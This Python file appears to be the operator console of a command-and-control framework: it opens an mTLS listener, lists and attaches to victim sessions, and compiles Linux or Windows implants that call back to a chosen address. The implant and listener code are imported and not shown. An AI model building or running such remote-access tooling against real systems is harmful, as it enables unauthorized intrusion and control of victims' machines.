#!/usr/bin/env python3
# TODO: Convert CLI to CMD2
import logging
from mtls import mtls
from generate.generate import generate
from queue import Queue

# TODO: maybe remove
# import os
# import sys
# db_module_path = os.getcwd() + '../../db'
# sys.path.insert(0, db_module_path)
from handler.handler import Handler


def main():
    requestq = Queue()
    handler = Handler(requestq)
    handler.start()
    endpoint = input("Enter Listner Address (Example: 172.17.0.2:31337)\n> ")
    try:
        listener = mtls.Listener(requestq, endpoint)
    except Exception as e:
        print(e)
        exit(1)

    while True:
        userin = input("> ")
        userin = userin.split()

        logging.basicConfig(filename="Command Log.txt", level=logging.INFO)
        commandStr = ' '.join(userin)
        logging.info("Command: " + commandStr)

        if len(userin) < 1:
            continue
        # Print sessions
        elif userin[0] == "sessions":
            for id in listener.sessions.list():
                print(id)
        # Interact with a session
        elif userin[0] == "use":
            if len(userin) == 2:
                conn, addr = listener.sessions.get(userin[1])
                print(f"Using session with {addr}")
                mtls.session(conn)
            else:
                print("Usage: use <session>")
        # Compile an implant
        elif userin[0] == "generate":
            if len(userin) != 3:
                print("Usage: generate <endpoint> linux|windows")
                continue

            if userin[2] != "linux" and userin[2] != "windows":
                print("Usage: generate 172.17.0.1:1337 linux|windows")
                continue

            print("Generating the implant...")
            generate(listener.client_certs, userin[1], userin[2])


if __name__ == "__main__":
    main()
